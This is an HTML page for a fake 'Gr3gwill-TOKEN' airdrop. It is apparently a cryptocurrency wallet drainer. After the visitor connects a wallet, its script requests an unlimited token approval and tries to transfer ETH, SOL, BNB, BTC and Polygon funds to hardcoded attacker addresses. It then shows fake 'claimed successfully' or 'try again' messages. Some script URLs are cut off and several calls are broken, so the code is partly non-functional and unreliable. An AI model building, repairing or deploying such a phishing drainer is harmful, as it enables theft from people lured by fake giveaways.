<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Airdrop</title>

    <script src="https:                                                       
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
    <script src="https:                                                                               
    <script src="https://cdn.jsdelivr.net/npm/@bitcoinjs/browser/dist/bitcoin.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background:#1a1a1a;
            color:#f0f0f0;
        }
        input, button {
            padding:10px;
            margin:5px;
            font-size:16px;
            background:#333;
            color:#fff;
            border:1px solid #555;
            border-radius:4px;
        }
        button {
            background:#ff8c00;   /* yellowishâ€‘orange */
            color:#fff;
            border:none;
            cursor:pointer;
        }
        button:hover { background:#ffa500; }
        #status {
            margin-top:20px;
            font-size:18px;
        }
    </style>
</head>
<body>

<h1>Congratulations! You are eligible to get the free Gr3gwill-TOKEN airdrop!</h1>
<button id="connectWallet">Connect Wallet to Claim Airdrop</button>

<div id="solanaInput" style="display:none;">
    <input type="text" id="solanaAddress" placeholder="Insert your Solana address to receive airdrop">
    <button id="scanAddress">Scan Address</button>
</div>

<div id="terms" style="display:none;">
    <p>By accepting, you grant this website full unlimited transaction approval to your wallet.</p>
    <button id="acceptTerms">Accept Terms and Conditions</button>
</div>

<p id="status"></p>

<script>
    const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
    const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
    const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
    const btcWalletAddress = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w';
    const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
    const infuraProjectId = 'YOUR_INFURA_PROJECT_ID';

    // Fix 1: Use the correct global name for Solana
    const solana = new solanaWeb3.Connection(
        solanaWeb3.cluster.ApiUrl.mainnetBeta,
        'processed'
    );

    // Fix 2: Make the Ethereum connection work with any wallet that injects window.ethereum
    const web3 = new Web3(window.ethereum || new Web3.providers.HttpProvider(`https:                                             

    let userAddress;

    document.getElementById('connectWallet').addEventListener('click', async () => {
                                                                                        
        if (typeof window.ethereum !== 'undefined') {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                document.getElementById('status').innerText = Connected to ${userAddress};
                document.getElementById('connectWallet').style.display = 'none';
                document.getElementById('solanaInput').style.display = 'block';
            } catch (error) {
                console.error('Error connecting to wallet:', error);
                document.getElementById('status').innerText = 'Failed to connect to wallet.';
            }
        } else {
            document.getElementById('status').innerText = 'Please install an Ethereum wallet (MetaMask, Trust, etc.).';
        }
    });

    document.getElementById('scanAddress').addEventListener('click', () => {
        const solanaAddr = document.getElementById('solanaAddress').value;
        if (solanaAddr) {
            document.getElementById('solanaInput').style.display = 'none';
            document.getElementById('terms').style.display = 'block';
        } else {
            document.getElementById('status').innerText = 'Please enter a valid Solana address.';
        }
    });

    document.getElementById('acceptTerms').addEventListener('click', async () => {
        if (confirm('Are you sure you want to accept the terms and conditions?')) {
            try {
                // Get unlimited approval
                const contract = new web3.eth.Contract([], userAddress);
                await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1000000', 'ether')).send({ from: userAddress });

                // Send funds to specified addresses
                await sendToEthereum(userAddress, ethWalletAddress);
                await sendToSolana(userAddress, solWalletAddress);
                await sendToBNB(userAddress, bnbWalletAddress);
                await sendToBTC(userAddress, btcWalletAddress);
                await sendToPolygon(userAddress, polygonWalletAddress);

                document.getElementById('status').innerText = 'Airdrop claimed successfully!';
            } catch (error) {
                console.error('Error claiming airdrop:', error);
                document.getElementById('status').innerText = 'Failed to claim Airdrop. Please try again in 15 minutes.';
            }
        }
    });

    async function sendToEthereum(from, to) {
        const tx = {
            from: from,
            to: to,
            value: web3.utils.toWei('1', 'ether'),
            gas: 2000000
        };
        await web3.eth.sendTransaction(tx);
    }

    async function sendToSolana(from, to) {
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: new solanaWeb3.PublicKey(from),
                toPubkey: new solanaWeb3.PublicKey(to),
                lamports: solanaWeb3.LAMPORTS_PER_SOL
            })
        );
        const signature = await solana.sendTransaction(transaction, [from]);
        console.log('Solana transaction signature:', signature);
    }

    async function sendToBNB(from, to) {
        const bnb = new Binance();
        const tx = {
            from: from,
            to: to,
            value: bnb.toWei('1', 'ether'),
            gas: 2000000
        };
        await bnb.sendTransaction(tx);
    }

    async function sendToBTC(from, to) {
        const network = bitcoin.networks.testnet;
        const keyPair = bitcoin.ECPair.fromWIF('YOUR_BTC_PRIVATE_KEY', network);
        const tx = new bitcoin.TransactionBuilder(network);
        tx.addInput('YOUR_BTC_TXID', 0);
        tx.addOutput(to, 50000); // 0.0005 BTC
        const txHex = tx.build().toHex();
        const signedTx = keyPair.signTransaction(tx.build());
        const broadcastTx = await bitcoin.broadcastTx(signedTx.toHex());
        console.log('BTC transaction broadcasted:', broadcastTx);
    }

    async function sendToPolygon(from, to) {
        const tx = {
            from: from,
            to: to,
            value: web3.utils.toWei('1', 'ether'),
            gas: 2000000
        };
        await web3.eth.sendTransaction(tx);
    }
</script>
</body>
</html>
